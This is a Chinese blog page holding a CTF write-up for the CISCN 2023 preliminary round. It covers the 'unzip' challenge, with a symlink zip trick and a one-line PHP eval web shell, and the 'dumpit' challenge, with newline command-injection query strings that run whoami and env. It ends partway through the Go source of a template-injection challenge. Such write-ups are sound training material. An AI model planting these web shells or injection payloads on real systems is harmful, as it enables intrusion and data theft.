<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>CISCN2023初赛 - mof's Blog</title><meta name=Description content="这是mof的博客"><meta property="og:title" content="CISCN2023初赛"><meta property="og:description" content="wp：https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q Web unzip <?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[&#34;file&#34;][&#34;tmp_name&#34;]) === 'application/zip'){ exec('cd /tmp && unzip -o"><meta property="og:type" content="article"><meta property="og:url" content="https://githubmof.github.io/ciscn2023%E5%88%9D%E8%B5%9B/"><meta property="og:image" content="https://githubmof.github.io/images/w.ico"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-13T16:20:20+08:00"><meta property="article:modified_time" content="2023-08-04T17:25:17+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://githubmof.github.io/images/w.ico"><meta name=twitter:title content="CISCN2023初赛"><meta name=twitter:description content="wp：https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q Web unzip <?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[&#34;file&#34;][&#34;tmp_name&#34;]) === 'application/zip'){ exec('cd /tmp && unzip -o"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/images/w.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://githubmof.github.io/ciscn2023%E5%88%9D%E8%B5%9B/><link rel=prev href=https://githubmof.github.io/2022%E5%AF%92%E5%81%87/><link rel=next href=https://githubmof.github.io/nssround#8-basic/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CISCN2023初赛","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/githubmof.github.io\/ciscn2023%E5%88%9D%E8%B5%9B\/"},"genre":"posts","keywords":"ctf","wordcount":1941,"url":"https:\/\/githubmof.github.io\/ciscn2023%E5%88%9D%E8%B5%9B\/","datePublished":"2023-07-13T16:20:20+08:00","dateModified":"2023-08-04T17:25:17+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"mof"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><a href=https://github.com/githubmof class=github-corner target=_blank title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="3.5rem" height="3.5rem" viewBox="0 0 250 250" style="fill:#70b7fd;color:#fff;position:absolute;top:0;border:0;left:0;transform:scale(-1,1)" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章
</a><a class=menu-item href=/tags/>标签
</a><a class=menu-item href=/categories/>分类</a><div class=dropdown><a href=javascript:void(0); class="menu-item menu-more dropbtn" title>游戏</a><div class="menu-more-content dropdown-content"><a href=/game/mikutap/ title target=_blank rel=noopener>mikutap </a><a href=/game/catch-the-cat/ title target=_blank rel=noopener>逮住那只猫!</a></div></div><a class=menu-item href=/about/>关于
</a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/ title>游戏</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CISCN2023初赛</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://github.com/githubmof title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>mof</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>ctf</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-07-13>2023-07-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 1941 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 4 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#unzip>unzip</a></li><li><a href=#dumpit>dumpit</a></li><li><a href=#go_session>go_session</a></li><li><a href=#deserbugjava之后再看>DeserBug（java，之后再看</a></li><li><a href=#reading>reading</a></li><li><a href=#backendservice>BackendService</a></li></ul></li><li><a href=#re>RE</a><ul><li><a href=#babyre>babyre</a></li></ul></li><li><a href=#misc>MISC</a><ul><li><a href=#被加密的生产流量>被加密的生产流量</a></li><li><a href=#pyshell>pyshell</a></li><li><a href=#国粹>国粹</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#基于国密sm2算法的密钥密文分发>基于国密SM2算法的密钥密文分发</a></li><li><a href=#可信度量>可信度量</a></li><li><a href=#sign_in_passwd>Sign_in_passwd</a></li><li><a href=#badkey1>badkey1</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>wp：<a href=https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q target=_blank rel="noopener noreffer">https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q</a></p><h2 id=web>Web</h2><h3 id=unzip>unzip</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$finfo</span> <span class=o>=</span> <span class=nx>finfo_open</span><span class=p>(</span><span class=nx>FILEINFO_MIME_TYPE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>finfo_file</span><span class=p>(</span><span class=nv>$finfo</span><span class=p>,</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>])</span> <span class=o>===</span> <span class=s1>&#39;application/zip&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>exec</span><span class=p>(</span><span class=s1>&#39;cd /tmp &amp;&amp; unzip -o &#39;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//only this!
</span></span></span></code></pre></div><p>构造软连接：</p><pre tabindex=0><code>ln -s /var/www/html test
zip --symlinks test.zip ./*
</code></pre><p>上传解压后/var/www/html指向test目录
构造木马：</p><pre tabindex=0><code>mkdir test
echo &#34;&lt;?php @eval($_GET[&#39;cmd&#39;]);&#34; &gt; test/cmd.php
zip -r test1.zip ./*
</code></pre><p>上传解压后可访问test目录下的木马</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png title=image-20230805011604202></p><h3 id=dumpit>dumpit</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png title=image-20230805011822254>
过滤的符号：
<img class=lazyload src=/svg/loading.min.svg data-src="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=, https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title= 1.5x, https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title= 2x" data-sizes=auto alt="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=" title="https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=">
/?db=bibin&table_2_dump=%00
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png title=image-20230805011833160>
/?db=bibin&table_2_dump=%0a
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png title=image-20230805011846369>
发现%0a闭合能执行命令，在env发现flag
/?db=q&table_2_dump=%0awhoami%0a
/?db=q&table_2_dump=%0env%0a //环境变量
<img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png data-srcset="https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png 1.5x, https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png title=image-20230805011910531></p><h3 id=go_session>go_session</h3><p><a href=https://un1novvn.github.io/2023/05/29/ciscn2023/ target=_blank rel="noopener noreffer">https://un1novvn.github.io/2023/05/29/ciscn2023/</a>
<a href=https://ctf.njupt.edu.cn/archives/898#go_session target=_blank rel="noopener noreffer">https://ctf.njupt.edu.cn/archives/898#go_session</a>
看官方文档 pongo
环境
route.go</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>package</span> <span class=nx>route</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;github.com/flosch/pongo2/v4&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;github.com/gorilla/sessions&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;html&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;io&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>var</span> <span class=nx>store</span> <span class=o>=</span> <span class=nx>sessions</span><span class=o>.</span><span class=nx>NewCookieStore</span><span class=p>([]</span><span class=nx>byte</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>func</span> <span class=nx>Index</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=o>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>session</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>store</span><span class=o>.</span><span class=nx>Get</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Request</span><span class=p>,</span> <span class=s2>&#34;session-name&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>err</span><span class=o>.</span><span class=nx>Error</span><span class=p>(),</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>session</span><span class=o>.</span><span class=nx>Values</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>session</span><span class=o>.</span><span class=nx>Values</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>err</span> <span class=o>=</span> <span class=nx>session</span><span class=o>.</span><span class=nx>Save</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Request</span><span class=p>,</span> <span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>err</span><span class=o>.</span><span class=nx>Error</span><span class=p>(),</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>c</span><span class=o>.</span><span class=nx>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s2>&#34;Hello, guest&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>func</span> <span class=nx>Admin</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=o>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>session</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>store</span><span class=o>.</span><span class=nx>Get</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Request</span><span class=p>,</span> <span class=s2>&#34;session-name&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>err</span><span class=o>.</span><span class=nx>Error</span><span class=p>(),</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>session</span><span class=o>.</span><span class=nx>Values</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>!=</span> <span class=s2>&#34;admin&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=s2>&#34;N0&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>name</span> <span class=o>:=</span> <span class=nx>c</span><span class=o>.</span><span class=nx>DefaultQuery</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=s2>&#34;ssti&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>xssWaf</span> <span class=o>:=</span> <span class=nx>html</span><span class=o>.</span><span class=nx>EscapeString</span><span class=p>(</span><span class=nx>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>tpl</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>pongo2</span><span class=o>.</span><span class=nx>FromString</span><span class=p>(</span><span class=s2>&#34;Hello &#34;</span> <span class=o>+</span> <span class=nx>xssWaf</span> <span class=o>+</span> <span class=s2>&#34;!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=c1>//tpl, err := pongo2.FromString(&#34;Hello &#34; + name + &#34;!&#34;)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>tpl</span><span class=o>.</span><span class=nx>Execute</span><span class=p>(</span><span class=nx>pongo2</span><span class=o>.</span><span class=nx>Context</span><span class=p>{</span><span class=s2>&#34;c&#34;</span><span class=o>:</span> <span class=nx>c</span><span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>err</span><span class=o>.</span><span class=nx>Error</span><span class=p>(),</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>c</span><span class=o>.</span><span class=nx>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>func</span> <span class=nx>Flask</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=o>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>session</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>store</span><span class=o>.</span><span class=nx>Get</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Request</span><span class=p>,</span> <span class=s2>&#34;session-name&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>err</span><span class=o>.</span><span class=nx>Error</span><span class=p>(),</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>session</span><span class=o>.</span><span class=nx>Values</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>http</span><span class=o>.</span><span class=nx>Error</span><span class=p>(</span><span class=nx>c</span><span class=o>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=s2>&#34;N0&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=o>.</span><span class=nx>StatusInternalServerError</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>resp</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>http</span><span class=o>.</span><span class=nx>Get</span><span class=p>(</span><span class=s2>&#34;http://127.0.0.1:5000/&#34;</span> <span class=o>+</span> <span class=nx>c</span><span class=o>.</span><span class=nx>DefaultQuery</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=s2>&#34;guest&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=nx>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>defer</span> <span class=nx>resp</span><span class=o>.</span><span class=nx>Body</span><span class=o>.</span><span class=nx>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>body</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>io</span><span class=o>.</span><span class=nx>ReadAll</span><span class=p>(</span><span class=nx>resp</span><span class=o>.</span><span class=nx>Body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>c</span><span class=o>.</span><span class=nx>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>string</span><span class=p>(</span><span class=nx>body</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>main.go</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;main/route&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>func</span> <span class=nx>main</span><span class=p>()</span> <span class=p>{</span>
